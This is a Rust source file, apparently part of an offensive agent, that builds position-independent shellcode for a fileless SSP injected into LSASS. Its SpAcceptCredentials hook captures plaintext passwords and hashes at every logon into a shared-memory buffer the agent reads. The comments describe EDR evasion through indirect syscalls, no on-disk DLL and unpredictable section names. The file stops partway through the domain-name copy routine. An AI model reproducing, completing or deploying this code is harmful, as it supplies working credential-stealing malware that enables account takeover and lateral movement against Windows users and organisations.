//! Position-independent SSP (Security Support Provider) stub for in-memory
//! LSASS injection.
//!
//! This module builds a minimal, relocatable SSP DLL image entirely in memory.
//! The image exports three callbacks required by the LSA SSP interface:
//!
//! - `SpInitialize`  — one-time initialisation (creates a named shared memory
//!   section for credential exfiltration).
//! - `SpShutDown`    — cleanup on SSP unload.
//! - `SpAcceptCredentials` — called by LSA for every authentication event;
//!   captures the supplied credentials into the shared memory ring buffer.
//!
//! # Constraints
//!
//! - **No DLL on disk.** The entire PE image is crafted in a `Vec<u8>` and
//!   injected into LSASS via `NtWriteVirtualMemory`.
//! - **Position-independent.** All address references use RIP-relative
//!   addressing or are patched at injection time via a relocation table.
//! - **Indirect syscalls only.** Memory allocation, writing, and thread
//!   creation in LSASS use the agent's indirect syscall infrastructure
//!   (`crate::syscalls::do_syscall`) to avoid ntdll IAT hooks.
//!
//! # Shared Memory Protocol
//!
//! The SSP stub communicates with the agent through a named file mapping
//! (name derived from the PSK via HKDF-SHA256).  The layout of the shared section is:
//!
//! ```text
//! offset 0   : u32  write_index   (next write position, atomically incremented)
//! offset 4   : u32  read_index    (next read position, set by agent)
//! offset 8   : u32  count         (total credentials written)
//! offset 12  : u32  generation    (incremented on overflow/wrap)
//! offset 16  : CredSlot[RING_CAPACITY]  (ring buffer of captured creds)
//! ```
//!
//! Each `CredSlot` is a fixed-size record:
//!
//! ```text
//! offset 0   : [u8; 64]  username  (UTF-16LE, null-padded)
//! offset 64  : [u8; 64]  domain    (UTF-16LE, null-padded)
//! offset 128 : [u8; 128] password  (UTF-16LE, null-padded; or hex hash)
//! offset 256 : u32       cred_type (0=msv, 1=wdigest, 2=kerberos, 3=dpapi)
//! offset 260 : u32       flags     (bit 0 = plaintext, bit 1 = hash)
//! total size : 264 bytes
//! ```

#![cfg(all(windows, feature = "lsa-whisperer"))]

use anyhow::{anyhow, Result};

/// Ring buffer capacity — 256 credential slots × 264 bytes ≈ 66 KB.
pub const RING_CAPACITY: u32 = 256;

/// Size of a single credential slot in bytes.
pub const CRED_SLOT_SIZE: usize = 264;

/// Total shared section size: header (16 bytes) + ring.
pub const SHM_SIZE: usize = 16 + (RING_CAPACITY as usize) * CRED_SLOT_SIZE;

/// Shared memory section name — generated once per agent process.
///
/// Derived from the agent's PSK + a per-injection random nonce via
/// HKDF-SHA256 so the name is:
///   • unique per-deployment (different PSKs produce different names)
///   • unique per-injection (the random nonce changes each time)
///   • not a static string EDR can signature-match
///   • not derivable from the PSK alone (V4-3-02)
///
/// Format: `Global\` + 32 lowercase hex chars (HKDF of PSK+nonce) + `_`
/// + 16 hex chars (nonce).  The `Global\` prefix ensures cross-session
/// visibility.  If no PSK is configured, falls back to random bytes.
static SHM_NAME: once_cell::sync::Lazy<Vec<u16>> =
    once_cell::sync::Lazy::new(generate_shm_name);

#[inline(always)]
fn invoke_nt_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    unsafe { crate::syscalls::do_syscall(ssn, gadget_addr, args) }
}

/// Derive the shared memory section name from the PSK + a random nonce.
///
/// Uses HKDF-SHA256 with (PSK || nonce) as IKM and a fixed info string to
/// produce 16 bytes, then hex-encodes them (32 characters) prefixed by
/// `Global\`.  The nonce is appended as `_` + 16 hex chars so that both the
/// SSP stub (which reads the name from the injected blob) and the agent-side
/// reader (which uses the same `SHM_NAME` static) agree on the name.
///
/// V4-3-02: The nonce ensures the section name is not predictable from the
/// PSK alone — a defender who compromises the PSK still cannot pre-compute
/// the section name without observing the nonce at runtime.
///
/// Total length: 7 + 32 + 1 + 16 = 56 chars, well under the 260-char NT
/// object name limit.  As UTF-16LE: 112 bytes + null terminator = 114 bytes,
/// fitting within the 128-byte (0x80) data-section reservation.
fn generate_shm_name() -> Vec<u16> {
    use rand::RngCore;

    let psk = crate::outbound::resolve_secret()
        .unwrap_or_else(|| {
            log::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
            // Fall back to random bytes so the agent still works in dev/test.
            let mut ikm = [0u8; 32];
            rand::rngs::OsRng.fill_bytes(&mut ikm);
            hex::encode(ikm)
        });

    // V4-3-02: Per-injection random nonce prevents section name prediction
    // even if the PSK is known.  The nonce is included in the section name
    // so both the SSP stub and the agent-side reader agree on the name.
    let mut nonce = [0u8; 8];
    rand::rngs::OsRng.fill_bytes(&mut nonce);

    // Combine PSK and nonce as HKDF input keying material.
    let mut combined_ikm = psk.as_bytes().to_vec();
    combined_ikm.extend_from_slice(&nonce);

    let hkdf = hkdf::Hkdf::<sha2::Sha256>::new(None, &combined_ikm);
    let mut derived = [0u8; 16];
    hkdf.expand(common::hkdf_info::SSP_SHM, &mut derived)
        .expect("HKDF expand for SSP SHM name must succeed");

    // Format: Global\{hex_derived}_{hex_nonce}
    let full = format!(
        "Global\\{}_{:016x}",
        hex::encode(derived),
        u64::from_be_bytes(nonce)
    );
    let mut wide: Vec<u16> = full.encode_utf16().collect();
    wide.push(0); // null terminator
    wide
}

// ── Credential type tags (written by the SSP stub, read by the agent) ──────

pub const CRED_TYPE_MSV: u32 = 0;
pub const CRED_TYPE_WDIGEST: u32 = 1;
pub const CRED_TYPE_KERBEROS: u32 = 2;
pub const CRED_TYPE_DPAPI: u32 = 3;

// ── Credential slot flags ──────────────────────────────────────────────────

pub const FLAG_PLAINTEXT: u32 = 0x01;
pub const FLAG_HASH: u32 = 0x02;

// ── Shared memory header layout ────────────────────────────────────────────

/// Header at the start of the shared memory section.
#[repr(C)]
pub struct ShmHeader {
    pub write_index: u32,
    pub read_index: u32,
    pub count: u32,
    pub generation: u32,
}

/// A single credential slot in the ring buffer.
#[repr(C)]
pub struct CredSlot {
    pub username: [u8; 64],
    pub domain: [u8; 64],
    pub password: [u8; 128],
    pub cred_type: u32,
    pub flags: u32,
}

// ── SSP shellcode builder ──────────────────────────────────────────────────

/// Build a minimal, position-independent PE image that implements the SSP
/// interface (SpInitialize, SpShutDown, SpAcceptCredentials).
///
/// Rather than constructing a full PE from scratch (which would be fragile
/// and large), we compile a Rust function with `#[no_mangle]` and the right
/// calling convention, then extract its machine code.  However, since we
/// cannot do that at runtime, we instead build a minimal position-independent
/// code blob that:
///
/// 1. On `SpInitialize`: creates the shared memory section via `NtCreateSection`
///    + `NtMapViewOfSection`, resolved by hash from ntdll.dll.
/// 2. On `SpAcceptCredentials`: copies credential strings from the LSA-supplied
///    UNICODE_STRING structures into the next available ring slot.
/// 3. On `SpShutDown`: unmaps and closes the shared section.
///
/// The blob uses a trampoline table at the end for all external references
/// (ntdll function hashes), which the injector patches with resolved addresses
/// before writing into LSASS.
///
/// # Returns
///
/// A `Vec<u8>` containing the complete SSP code blob ready for injection.
///
/// # Architecture
///
/// x86_64 only.  The code is built as a flat binary with a small dispatch
/// table at the start that the LSA SSP loader will call into.
pub fn build_ssp_blob() -> Result<Vec<u8>> {
    // ── Blob layout ────────────────────────────────────────────────
    //   0x000: SpInitialize  — NtCreateSection + NtMapViewOfSection
    //                         + zero-init + NtUnmapViewOfSection
    //   ~0x180: SpShutDown   — stub (xor eax,eax; ret)
    //   ~0x1A0: SpAcceptCredentials — credential capture shellcode
    //   0x500: Data section   — section name (UTF-16LE)
    //   0x600: Function pointer table (pre-resolved ntdll addresses)
    //
    // All address references use the call/pop technique to obtain a
    // position-independent anchor.  On Windows 10+, ntdll.dll loads at
    // the same base address in every process, so function pointers
    // resolved in the agent process are valid inside LSASS.
    //
    // Function pointer table layout:
    //   [+0x00] NtCreateSection       (SpInitialize)
    //   [+0x08] NtOpenSection         (SpAcceptCredentials)
    //   [+0x10] NtMapViewOfSection    (shared)
    //   [+0x18] NtUnmapViewOfSection  (shared)
    //   [+0x20] NtClose               (shared)

    const OFF_SSP_SHUTDOWN: usize = 0x200;
    const OFF_DATA: usize = 0x500;
    const OFF_FT: usize   = 0x600;

    let mut blob = Vec::with_capacity(0x800);

    // Data-section offset where SpInitialize stores the mapped base
    // address (8 bytes).  Placed well past the UTF-16 section name
    // (max ~80 bytes for a 39-char name).
    const OFF_STORED_BASE: usize = 0x80;

    // SpInitialize-specific jump-patch bookkeeping
    let mut init_near_patches: Vec<(usize, usize)> = Vec::new();
    let mut init_label_offsets: [usize; 1] = [0; 1];
    const L_INIT_EPILOGUE: usize = 0;

    // ── Prologue ──────────────────────────────────────────────────
    blob.extend_from_slice(&[0x55]);                         // push rbp
    blob.extend_from_slice(&[0x53]);                         // push rbx
    blob.extend_from_slice(&[0x56]);                         // push rsi
    blob.extend_from_slice(&[0x57]);                         // push rdi
    blob.extend_from_slice(&[0x41, 0x54]);                   // push r12
    blob.extend_from_slice(&[0x41, 0x55]);                   // push r13
    blob.extend_from_slice(&[0x41, 0x56]);                   // push r14
    blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
    blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x108
    blob.extend_from_slice(&0x108u32.to_le_bytes());

    // Get position-independent anchor: call $+5; pop r15
    blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
    blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
    let r15_off_init = blob.len() - 2;

    // Deltas from r15 to key blob offsets for SpInitialize
    let d_data_init  = (OFF_DATA         - r15_off_init) as u32;
    let d_ft_create  = (OFF_FT           - r15_off_init) as u32; // NtCreateSection
    let d_ft_map_i   = (OFF_FT + 0x10    - r15_off_init) as u32; // NtMapViewOfSection

    // ── Zero the stack frame (33 qwords) ──────────────────────────
    blob.extend_from_slice(&[0x31, 0xC0]);                           // xor eax, eax
    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]);        // mov ecx, 33
    blob.extend_from_slice(&[0x48, 0x89, 0xE7]);                     // mov rdi, rsp
    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);                     // rep stosq

    // ── Build UNICODE_STRING at [rsp+0x68] ────────────────────────
    // (Name bytes are resolved later when SHM_NAME is available, but the
    //  length constants are computed from SHM_NAME here for both functions.)
    let shm_name = &*SHM_NAME;
    let name_chars = shm_name.len() - 1; // exclude null terminator
    let name_byte_len = (name_chars * 2) as u16;

    // Buffer = r15 + d_data_init (address of name bytes in the blob)
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_data_init]
    blob.extend_from_slice(&d_data_init.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x70]); // mov [rsp+0x70], rax
    blob.extend_from_slice(&[0x66, 0xC7, 0x44, 0x24, 0x68]); // mov word [rsp+0x68], len
    blob.extend_from_slice(&name_byte_len.to_le_bytes());
    blob.extend_from_slice(&[0x66, 0xC7, 0x44, 0x24, 0x6A]); // mov word [rsp+0x6A], maxlen
    blob.extend_from_slice(&name_byte_len.to_le_bytes());

    // ── Build OBJECT_ATTRIBUTES at [rsp+0x78] ─────────────────────
    blob.extend_from_slice(&[0x48, 0x8D, 0x5C, 0x24, 0x78]); // lea rbx, [rsp+0x78]
    blob.extend_from_slice(&[0xC7, 0x03, 0x30, 0x00, 0x00, 0x00]); // mov dword [rbx], 48
    blob.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x68]); // lea rax, [rsp+0x68]
    blob.extend_from_slice(&[0x48, 0x89, 0x43, 0x10]);        // mov [rbx+0x10], rax
    blob.extend_from_slice(&[0xC7, 0x43, 0x18, 0x40, 0x00, 0x00, 0x00]); // mov dword [rbx+0x18], 0x40

    // ── Build LARGE_INTEGER SectionSize at [rsp+0xA8] ─────────────
    // SHM_SIZE = 16 + RING_CAPACITY * CRED_SLOT_SIZE
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0xA8]); // mov qword [rsp+0xA8], imm32
    blob.extend_from_slice(&(SHM_SIZE as u32).to_le_bytes());

    // ── NtCreateSection(&handle, SECTION_ALL_ACCESS, &obj_attr,
    //                    &section_size, PAGE_READWRITE, SEC_COMMIT, NULL) ──
    // Stack params (5th–7th):
    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20,
                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x20] SectionPageProtection = PAGE_READWRITE
    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28,
                             0x00, 0x00, 0x00, 0x08]);         // [rsp+0x28] AllocationAttributes = SEC_COMMIT (0x08000000)
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x30,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x30] FileHandle = NULL

    // Load NtCreateSection function pointer
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft_create]
    blob.extend_from_slice(&d_ft_create.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
    // jz epilogue (near)
    let jz_create_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
    init_near_patches.push((jz_create_patch, L_INIT_EPILOGUE));

    // Register params
    blob.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x50]); // lea rcx, [rsp+0x50] &SectionHandle
    blob.extend_from_slice(&[0xBA, 0x1F, 0x00, 0x0F, 0x00]); // mov edx, SECTION_ALL_ACCESS (0x000F001F)
    blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x78]); // lea r8, [rsp+0x78]  &ObjectAttributes
    blob.extend_from_slice(&[0x4C, 0x8D, 0x8C, 0x24,
                             0xA8, 0x00, 0x00, 0x00]);         // lea r9, [rsp+0xA8] &SectionSize
    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // js epilogue (near)
    let js_create_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
    init_near_patches.push((js_create_patch, L_INIT_EPILOGUE));

    // Check SectionHandle
    blob.extend_from_slice(&[0x48, 0x8B, 0x5C, 0x24, 0x50]); // mov rbx, [rsp+0x50]
    blob.extend_from_slice(&[0x48, 0x85, 0xDB]);             // test rbx, rbx
    // jz epilogue (near)
    let jz_handle_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
    init_near_patches.push((jz_handle_patch, L_INIT_EPILOGUE));

    // ── NtMapViewOfSection(10 params) — map to zero-init ──────────
    // Set ViewSize = SHM_SIZE at [rsp+0x60]
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x60]); // mov qword [rsp+0x60], SHM_SIZE
    blob.extend_from_slice(&(SHM_SIZE as u32).to_le_bytes());

    // Stack params (5th–10th):
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x20] CommitSize = 0
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x28] SectionOffset = NULL
    blob.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x60]); // lea rax, [rsp+0x60]
    blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x30]); // [rsp+0x30] = &ViewSize
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x38,
                             0x01, 0x00, 0x00, 0x00]);         // [rsp+0x38] InheritDisposition = 1
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x40,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x40] AllocationType = 0
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x48,
                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x48] Win32Protect = PAGE_READWRITE

    // Load NtMapViewOfSection
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft_map_i]
    blob.extend_from_slice(&d_ft_map_i.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
    // Register params
    blob.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x50]); // mov rcx, [rsp+0x50] SectionHandle
    blob.extend_from_slice(&[0x48, 0xC7, 0xC2,
                             0xFF, 0xFF, 0xFF, 0xFF]);         // mov rdx, -1 (current process)
    blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x58]); // lea r8, [rsp+0x58] &BaseAddress
    blob.extend_from_slice(&[0x45, 0x31, 0xC9]);             // xor r9d, r9d  ZeroBits=0
    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // js epilogue (near) — on failure, jump to epilogue (no cleanup needed)
    let js_map_init_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
    init_near_patches.push((js_map_init_patch, L_INIT_EPILOGUE));

    // Load mapped base address
    blob.extend_from_slice(&[0x4C, 0x8B, 0x74, 0x24, 0x58]); // mov r14, [rsp+0x58]
    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
    // jz epilogue (near)
    let jz_base_init_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
    init_near_patches.push((jz_base_init_patch, L_INIT_EPILOGUE));

    // ── Zero the entire shared memory section ─────────────────────
    // SHM_SIZE / 8 qwords — ensures header and all slots are zeroed.
    // Although SEC_COMMIT pages are zeroed by the OS, we zero explicitly
    // to be safe against stale page-file contents.
    blob.extend_from_slice(&[0xB9]);                           // mov ecx, SHM_SIZE / 8
    blob.extend_from_slice(&(SHM_SIZE as u32 / 8).to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x89, 0xF7]);             // mov rdi, r14
    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq

    // ── Store the mapped base address at OFF_DATA + OFF_STORED_BASE ──
    // V3-04 fix: SpAcceptCredentials reads the base from this location
    // instead of re-opening the section via NtOpenSection.  The mapping
    // is kept alive for the lifetime of the SSP.
    let d_stored_base = (OFF_DATA + OFF_STORED_BASE - r15_off_init) as u32;
    // mov [r15+d_stored_base], r14
    blob.extend_from_slice(&[0x4D, 0x89, 0xB7]);             // mov [r15+disp32], r14
    blob.extend_from_slice(&d_stored_base.to_le_bytes());

    // ── epilogue (NO unmap, NO close — section stays alive) ───────
    // V3-04 fix: we intentionally skip NtUnmapViewOfSection and NtClose
    // here.  The mapping and handle must persist so that:
    //   (a) the named section object remains in the NT namespace, and
    //   (b) SpAcceptCredentials can read the stored base address.
    init_label_offsets[L_INIT_EPILOGUE] = blob.len();
    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax  (STATUS_SUCCESS)
    blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x108
    blob.extend_from_slice(&0x108u32.to_le_bytes());
    blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
    blob.extend_from_slice(&[0x41, 0x5E]);                     // pop r14
    blob.extend_from_slice(&[0x41, 0x5D]);                     // pop r13
    blob.extend_from_slice(&[0x41, 0x5C]);                     // pop r12
    blob.extend_from_slice(&[0x5F]);                         // pop rdi
    blob.extend_from_slice(&[0x5E]);                         // pop rsi
    blob.extend_from_slice(&[0x5B]);                         // pop rbx
    blob.extend_from_slice(&[0x5D]);                         // pop rbp
    blob.push(0xC3);                                         // ret

    // ── Patch near jumps for SpInitialize ─────────────────────────
    for &(patch_off, lbl) in &init_near_patches {
        let target = init_label_offsets[lbl];
        let rel32 = (target as i32) - (patch_off as i32 + 4);
        blob[patch_off..patch_off + 4].copy_from_slice(&rel32.to_le_bytes());
    }

    // Pad to SpShutDown boundary
    blob.resize(OFF_SSP_SHUTDOWN, 0x90);

    // ═══════════════════════════════════════════════════════════════
    //  SpShutDown (OFF_SSP_SHUTDOWN) — stub: return STATUS_SUCCESS
    // ═══════════════════════════════════════════════════════════════
    blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
    blob.extend_from_slice(&[0x31, 0xC0]);               // xor eax, eax
    blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
    blob.push(0xC3);                                     // ret


    // ═══════════════════════════════════════════════════════════════
    //  SpAcceptCredentials (~0x040) — credential capture
    //
    //  Windows x64 calling convention:
    //    rcx = PLSA_CLIENT_REQUEST  (unused)
    //    rdx = SECURITY_LOGON_TYPE  (unused)
    //    r8  = PSECPKG_PRIMARY_CREDENTIALS (credential struct)
    //    r9  = Supplemental credentials (unused)
    //
    //  V3-01 fix: LSA passes PSECPKG_PRIMARY_CREDENTIALS (with S),
    //  which contains *pointers* to UNICODE_STRING, not embedded
    //  UNICODE_STRING structs.  Layout:
    //    +0x00: LogonId           (LUID: 8 bytes)
    //    +0x08: DownlevelName     (PUNICODE_STRING → pointer)
    //    +0x10: DomainName        (PUNICODE_STRING → pointer)
    //    +0x18: Password          (PUNICODE_STRING → pointer)
    //
    //  Each pointer targets a UNICODE_STRING:
    //    +0x00: Length   (u16)
    //    +0x02: MaxLength(u16)
    //    +0x08: Buffer   (PWSTR → pointer to wide chars)
    //
    //  V3-05 fix: Ring buffer slot acquisition uses lock xadd for
    //  atomic fetch-and-increment of write_index, eliminating the
    //  TOCTOU race between lock inc and the non-atomic mask.
    //
    //  The mapped base address is read from OFF_DATA + OFF_STORED_BASE
    //  (written by SpInitialize during SSP load).  No NtOpenSection or
    //  NtMapViewOfSection calls are needed.
    //
    //  Register allocation:
    //    r15 = position-independent anchor (address of pop-r15)
    //    r14 = mapped section base (from stored base address)
    //    r13 = credential struct pointer (from r8)
    //    r12 = temp (UNICODE_STRING pointer / buffer pointer)
    //    rbx = CredSlot base
    //    rsi/rdi = copy source/dest (for rep movsb)
    //
    //  Stack frame (after sub rsp, 0x28): minimal — only shadow space
    //  since we no longer call NT APIs.
    // ═══════════════════════════════════════════════════════════════

    // ── Prologue ──────────────────────────────────────────────────
    blob.extend_from_slice(&[0x55]);                         // push rbp
    blob.extend_from_slice(&[0x53]);                         // push rbx
    blob.extend_from_slice(&[0x56]);                         // push rsi
    blob.extend_from_slice(&[0x57]);                         // push rdi
    blob.extend_from_slice(&[0x41, 0x54]);                   // push r12
    blob.extend_from_slice(&[0x41, 0x55]);                   // push r13
    blob.extend_from_slice(&[0x41, 0x56]);                   // push r14
    blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
    blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x28
    blob.extend_from_slice(&0x28u32.to_le_bytes());
    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]);             // mov r13, r8   (3rd param — PSECPKG_PRIMARY_CREDENTIALS)
    // Get position-independent anchor: call $+5; pop r15
    blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
    blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
    let r15_off = blob.len() - 2;

    // Delta from r15 to the stored base address in the data section
    let d_stored_base = (OFF_DATA + OFF_STORED_BASE - r15_off) as u32;

    // ── Validate credential pointer ───────────────────────────────
    blob.extend_from_slice(&[0x4D, 0x85, 0xED]);             // test r13, r13
    // jz epilogue (short, +0)
    // We'll emit a near jz; patch target later.  Use the same
    // label-patching scheme as SpInitialize.
    let cred_jz_epilogue = blob.len() + 2;
    // Placeholder: jz rel32 (6 bytes)
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);

    // ── Load mapped base address from stored location ──────────────
    // V3-04 fix: SpInitialize stored the base at OFF_DATA + OFF_STORED_BASE.
    // No NtOpenSection/NtMapViewOfSection calls needed.
    // mov r14, [r15+d_stored_base]
    blob.extend_from_slice(&[0x49, 0x8B, 0xB7]);             // mov r14, [r15+disp32]
    blob.extend_from_slice(&d_stored_base.to_le_bytes());
    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
    // jz epilogue (near) — if base is NULL, SpInitialize must have failed
    let base_jz_epilogue = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);

    // ── Atomically acquire a slot via lock xadd ────────────────────
    // V3-05 fix: use lock xadd to atomically fetch the old write_index
    // and increment it by 1 in a single operation.  This eliminates the
    // TOCTOU race between the old lock inc and the subsequent non-atomic
    // mask+store.
    //
    // Encoding: F0=LOCK, 0F C1 /r = XADD r/m32, r32
    //   lock xadd dword [r14], ecx
    //   → ecx = old write_index,  [r14] = old + 1
    //
    // After xadd, ecx holds the OLD index.  Compute the slot from it.
    blob.extend_from_slice(&[0xB9, 0x01, 0x00, 0x00, 0x00]); // mov ecx, 1
    // lock xadd [r14], ecx
    blob.extend_from_slice(&[0xF0, 0x41, 0x0F, 0xC1, 0x0E]); // F0=LOCK 41=REX.B 0FC1=XADD /1=0E=[r14]

    // ── Compute slot address from old index ────────────────────────
    // slot_offset = (old_index % 256) * CRED_SLOT_SIZE(264)
    blob.extend_from_slice(&[0x81, 0xE1, 0xFF, 0x00,
                             0x00, 0x00]);                     // and ecx, 0x000000FF
    blob.extend_from_slice(&[0x69, 0xC9, 0x08, 0x01,
                             0x00, 0x00]);                     // imul ecx, ecx, 264
    blob.extend_from_slice(&[0x49, 0x8D, 0x5E, 0x10]);       // lea rbx, [r14+16]  (slots start after 16-byte header)
    blob.extend_from_slice(&[0x48, 0x03, 0xD9]);             // add rbx, rcx  → rbx = &CredSlot[slot]

    // ── Zero the slot (33 qwords = 264 bytes) ─────────────────────
    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq

    // ═══════════════════════════════════════════════════════════════
    //  Copy credential fields (V3-01 fix: two-level pointer deref)
    //
    //  For each field (DownlevelName, DomainName, Password):
    //    1. Read the PUNICODE_STRING pointer from r13+offset
    //    2. Read Length from [ptr+0x00]
    //    3. Read Buffer from [ptr+0x08]
    //    4. Copy min(Length, max_bytes) bytes from Buffer to slot
    // ═══════════════════════════════════════════════════════════════

    // ── Copy DownlevelName (PUNICODE_STRING at r13+0x08) ──────────
    // Read pointer to UNICODE_STRING
    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x08]);       // mov r12, [r13+0x08]     (4 bytes)
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12            (3 bytes)
    // Sequence after jz (to skip_username):
    //   movzx eax, word [r12+0x00]        6 bytes  (41 0F B7 44 24 00)
    //   test eax, eax                     2 bytes  (85 C0)
    //   jz +0x20                          2 bytes  (74 20)
    //   cmp eax, 128                      5 bytes  (3D 80 00 00 00)
    //   jbe +5                            2 bytes  (76 05)
    //   mov eax, 128                      5 bytes  (B8 80 00 00 00)
    //   mov ecx, eax                      2 bytes  (89 C1)
    //   mov r12, [r12+0x08]               5 bytes  (49 8B 64 24 08)
    //   test r12, r12                     3 bytes  (4D 85 E4)
    //   jz +0x08                          2 bytes  (74 08)
    //   mov rsi, r12                      3 bytes  (4C 89 E6)
    //   mov rdi, rbx                      3 bytes  (48 89 DF)
    //   rep movsb                         2 bytes  (F3 A4)
    //   Total: 42 bytes → jz = 0x2A
    blob.extend_from_slice(&[0x74, 0x2A]);                     // jz skip_username (42 bytes)
    // Read Length from UNICODE_STRING
    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
                             0x00]);                             // movzx eax, word [r12+0x00]
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+mov(3)+rep(2) = 32 → 0x20
    blob.extend_from_slice(&[0x74, 0x20]);                     // jz skip_username (32 bytes to end of block)
    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    // Read Buffer from UNICODE_STRING
    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
                             0x08]);                             // mov r12, [r12+0x08]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    // Inner skip: 3+3+2 = 8 bytes → jz = 0x08
    blob.extend_from_slice(&[0x74, 0x08]);                     // jz skip_username
    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
    // skip_username:

    // ── Copy DomainName (PUNICODE_STRING at r13+0x10) ─────────────
    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]);       // mov r12, [r13+0x10]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    // Sequence after jz (to skip_domain):
    //   movzx eax, word [r12+0x00]        6 bytes
    //   test eax, eax                     2 bytes
    //   jz +0x21                          2 bytes  (74 21)
    //   cmp eax, 128                      5 bytes
    //   jbe +5                            2 bytes
    //   mov eax, 128                      5 bytes
    //   mov ecx, eax                      2 bytes
    //   mov r12, [r12+0x08]               5 bytes
    //   test r12, r12                     3 bytes
